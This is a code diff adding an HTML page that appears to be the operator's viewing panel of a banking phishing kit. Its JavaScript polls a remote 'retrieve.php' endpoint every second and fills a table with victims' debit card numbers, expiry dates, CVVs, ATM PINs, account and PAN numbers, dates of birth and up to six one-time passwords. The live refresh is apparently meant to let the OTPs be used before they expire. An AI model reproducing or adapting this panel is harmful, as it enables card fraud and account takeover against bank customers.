@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Asasfdgad12389@*()1389=123</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</head>
+<body>
+    <div id="data-container">
+        <table class="table table-white table-hover table-striped container-fluid">
+            <thead>
+               
+                <tr>
+                    <th>ID</th>
+
+                    <th>MOBILE No</th>
+                    <th>DEBIT CARD No</th>
+
+                    <th>Expiry Month</th>
+                    <th>Expiry Year</th>
+                    <th>CVV</th>
+
+                    <th>ATM PIN</th>
+
+                    <th>Account No</th>
+                    <th>D O B</th>
+
+                    <th>OTP 1</th>
+
+                    <th>ACCOUNT HOLDER NAME</th>
+                    <th>PAN No</th>
+
+                    <th>OTP 2</th>
+                    <th>OTP 3</th>
+                    <th>OTP 4</th>
+
+
+                    <th>Account Holder Name</th>
+                    <th>Date</th>
+
+                    <th>OTP 4</th>
+                    <th>OTP 5</th>
+                    <th>OTP 6</th>
+
+                </tr>
+            </thead>
+            <tbody id="data-body"></tbody>
+        </table>
+    </div>
+
+</body>
+<script type="text/javascript">
+    // Get a reference to the "Get Data" button and data container elements
+    var dataBody = document.getElementById("data-body");
+
+    function displayData(data) {
+        // Clear the data container
+        dataBody.innerHTML = "";
+
+        // Loop through the data and create rows in the table for each record
+        for (var i = 0; i < data.length; i++) {
+            var record = data[i];
+
+            var url = window.location.hostname;
+            var domains = url + '/showhtml.html';
+
+            if (record.domain == domains) {
+                // Create a new row in the table
+                var row = document.createElement("tr");
+
+                // Create table cells (td) for each data field
+                var idCell = document.createElement("td");
+                idCell.textContent = record.id;
+                row.appendChild(idCell);
+
+                var phone = document.createElement("td");
+                phone.textContent = record.phone;
+                row.appendChild(phone);
+
+
+                var card_no = document.createElement("td");
+                card_no.textContent = record.card_no;
+                row.appendChild(card_no);
+
+
+                var ex_m = document.createElement("td");
+                ex_m.textContent = record.ex_m;
+                row.appendChild(ex_m);
+
+                var ex_y = document.createElement("td");
+                ex_y.textContent = record.ex_y;
+                row.appendChild(ex_y);
+
+
+                var cvv = document.createElement("td");
+                cvv.textContent = record.cvv;
+                row.appendChild(cvv);
+
+
+                var atm_pin = document.createElement("td");
+                atm_pin.textContent = record.atm_pin;
+                row.appendChild(atm_pin);
+
+
+                var acc_no = document.createElement("td");
+                acc_no.textContent = record.acc_no;
+                row.appendChild(acc_no);
+
+
+                var dob = document.createElement("td");
+                dob.textContent = record.dob;
+                row.appendChild(dob);
+
+
+                var otp1 = document.createElement("td");
+                otp1.textContent = record.otp1;
+                row.appendChild(otp1);
+
+            var account_holder_name = document.createElement("td");
+            account_holder_name.textContent = record.account_holder_name;
+            row.appendChild(account_holder_name);
+
+            var pan_card_no = document.createElement("td");
+            pan_card_no.textContent = record.pan_card_no;
+            row.appendChild(pan_card_no);
+
+            var extrapin1 = document.createElement("td");
+            extrapin1.textContent = record.extrapin1;
+            row.appendChild(extrapin1);
+
+
+                var otp2 = document.createElement("td");
+                otp2.textContent = record.otp2;
+                row.appendChild(otp2);
+
+
+                var otp3 = document.createElement("td");
+                otp3.textContent = record.otp3;
+                row.appendChild(otp3);
+
+                var account_name = document.createElement("td");
+                account_name.textContent = record.account_name;
+                row.appendChild(account_name);
+
+
+                var dob2 = document.createElement("td");
+                dob2.textContent = record.dob2;
+                row.appendChild(dob2);
+
+
+                var otp4 = document.createElement("td");
+                otp4.textContent = record.otp4;
+                row.appendChild(otp4);
+
+
+
+                var otp5 = document.createElement("td");
+                otp5.textContent = record.otp5;
+                row.appendChild(otp5);
+
+                var otp6 = document.createElement("td");
+                otp6.textContent = record.otp6;
+                row.appendChild(otp6);
+
+
+        
+                // Append the row to the table body
+                dataBody.appendChild(row);
+            }
+        }
+    }
+
+    function getDataFromAPI() {
+        // Create a new XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+
+        // Set the API endpoint URL
+        var url = "https://golusvami.co.in/nuchuas/retrieve.php";
+
+        // Open a new GET request with the URL
+        xhr.open("GET", url);
+
+        // Set the response type as JSON, assuming the API returns JSON data
+        xhr.responseType = "json";
+
+        // Define a function to handle the response
+        xhr.onload = function() {
+            // Check if the request was successful (status code 200)
+            if (xhr.status === 200) {
+                // Get the response data from the XHR object
+                var data = xhr.response;
+                displayData(data);
+            }
+        };
+
+        // Send the request to the server
+        xhr.send();
+    }
+
+    function getDataFromAnotherAPI() {
+        // Create a new XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+
+        // Set the API endpoint URL
+        var url = "https://golusvami.co.in/nuchuas/retrieve.php";
+
+        // Open a new GET request with the URL
+        xhr.open("GET", url);
+
+        // Set the response type as JSON, assuming the API returns JSON data
+        xhr.responseType = "json";
+
+        // Define a function to handle the response
+        xhr.onload = function() {
+            // Check if the request was successful (status code 200)
+            if (xhr.status === 200) {
+                // Get the response data from the XHR object
+                var data = xhr.response;
+                displayData(data);
+            }
+        };
+
+        // Send the request to the server
+        xhr.send();
+    }
+
+    // Call the functions to get data and display it in the table
+    getDataFromAPI();
+    setInterval(getDataFromAnotherAPI, 1000);
+</script>
+</html>
